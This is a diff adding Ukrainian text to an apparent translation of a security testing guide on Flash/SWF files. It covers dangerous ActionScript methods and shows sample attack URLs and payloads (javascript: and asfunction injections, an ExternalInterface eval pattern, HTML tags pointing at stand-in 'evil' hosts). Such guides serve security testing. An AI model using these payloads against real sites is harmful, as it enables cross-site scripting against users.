@@ -104,9 +104,9 @@ FlashVars також можна ініціалізувати з URL:
 
 Приклад:
 
-> movieClip 328 __Packages.Locale {
+>     movieClip 328 __Packages.Locale {
 > 
-> #initclip
+>     #initclip
 > 
 >     if (!_global.Locale) {
 > 
@@ -152,3 +152,118 @@ FlashVars також можна ініціалізувати з URL:
 > 
 >     };
 
+Наведений вище код можна атакувати, запитуючи:
+
+> `http://victim/file.swf?language=http://evil.example.org/malicious.xml?`
+
+## Небезпечні методи
+Коли визначено точку входу, дані, які вона представляє, можуть бути використані небезпечними методами. Якщо дані не відфільтровано чи перевірено, це може призвести до певних уразливостей.
+
+Небезпечними методами з версії r47 є:
+
+* loadVariables()
+* loadMovie()
+* getURL()
+* loadMovie()
+* loadMovieNum()
+* FScrollPane.loadScrollContent()
+* LoadVars.load
+* LoadVars.send
+* XML.load ( 'url' )
+* LoadVars.load ( 'url' )
+* Sound.loadSound( 'url' , isStreaming );
+* NetStream.play( 'url' );
+* flash.external.ExternalInterface.call(_root.callback)
+* htmlText
+
+## Експлуатація Reflected XSS
+Swf-файл має бути розміщено на хості жертви, і слід використовувати техніку відображеного XSS. Зловмисник змушує веб-переглядач завантажити чистий swf-файл безпосередньо в рядок розташування (шляхом переспрямування чи соціальної інженерії) або завантажуючи його через iframe зі зловмисної сторінки:
+
+> `<iframe src='http://victim/path/to/file.swf'></iframe>`
+
+У цій ситуації веб-переглядач самостійно створить HTML-сторінку, як якщо б вона була розміщена на хості-жертві.
+
+## GetURL (AS2) / NavigateToURL (AS3)
+Функція GetURL у ActionScript 2.0 і NavigateToURL у ActionScript 3.0 дозволяє фільму завантажувати URI у вікно браузера. Якщо невизначена змінна використовується як перший аргумент для getURL:
+
+> getURL(_root.URI,'_targetFrame');
+
+Або якщо FlashVar використовується як параметр, який передається у функцію navigateToURL:
+
+> var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
+> 
+> navigateToURL(request);
+
+Тоді це означатиме, що можна викликати JavaScript у тому ж домені, де розміщено фільм, запитуючи:
+
+> http://victim/file.swf?URI=javascript:evilcode
+>
+> getURL('javascript:evilcode','_self');
+
+Те саме можливо, коли лише деяка частина `getURL` контролюється за допомогою ін’єкції DOM із ін’єкцією Flash JavaScript:
+
+> getUrl('javascript:function('+_root.arg+')')
+
+## Використання `asfunction`
+Ви можете використовувати спеціальний протокол `asfunction`, щоб змусити посилання виконувати функцію ActionScript у файлі SWF замість відкриття URL-адреси. До випуску Flash Player 9 r48 `asfunction` могла бути використовувана для кожного методу, який має URL як аргумент. Після цього випуску функцію `asfunction` було обмежено для використання в текстовому полі HTML.
+
+Це означає, що тестер може спробувати ввести:
+
+> asfunction:getURL,javascript:evilcode
+
+у кожному небезпечному методі, наприклад:
+
+> loadMovie(_root.URL)
+
+за запитом:
+
+> `http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode`
+
+## Зовнішній інтерфейс
+`ExternalInterface.call` — це статичний метод, запроваджений Adobe для покращення взаємодії програвача та браузера для ActionScript 2.0 і ActionScript 3.0.
+
+З точки зору безпеки ним можна зловживати, якщо частину його аргументів можна контролювати:
+
+> flash.external.ExternalInterface.call(_root.callback);
+
+схема атаки для такого роду дефектів може бути приблизно такою:
+
+> eval(evilcode)
+
+оскільки внутрішній JavaScript, який виконується браузером, буде чимось схожим на:
+
+> eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')
+
+## HTML ін'єкції
+Об’єкти TextField можуть відтворювати мінімальний HTML, установивши:
+
+> tf.html = true
+> 
+> tf.htmlText = '<tag>text</tag>'
+
+Таким чином, якщо деяка частина тексту може контролюватися тестером, тег `<a>` або тег зображення можуть бути вставлені, що призведе до зміни графічного інтерфейсу користувача або XSS-атаки на браузер.
+
+Деякі приклади атак з тегом `<a>`:
+
+* Прямий XSS: `<a href='javascript:alert(123)'>`
+* Виклик функції: `<a href='asfunction:function,arg'>`
+* Виклик загальнодоступних функцій SWF: `<a href='asfunction:_root.obj.function, arg'>`
+* Викликати рідну статику як функцію: `<a href='asfunction:System.Security.allowDomain,evilhost'>`
+
+Також можна використовувати тег зображення:
+
+> `<img src='http://evil/evil.swf'>`
+
+У цьому прикладі `.swf` необхідний для обходу внутрішнього фільтра Flash Player:
+
+> `<img src='javascript:evilcode//.swf'>`
+
+З моменту випуску Flash Player 9.0.124.0 XSS більше не можна використовувати, але модифікація графічного інтерфейсу все одно може бути виконана.
+
+Наступні інструменти можуть бути корисними для роботи з SWF:
+
+* [Adobe SWF Investigator](https://labs.adobe.com/technologies/swfinvestigator/)
+* [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)
+* [Декомпілятор – Flare](http://www.nowrap.de/flare.html)
+* [Дизассемблер – Flasm](https://flasm.sourceforge.net/)
+* [Swfmill – перетворює Swf на XML і навпаки](https://www.swfmill.org/)
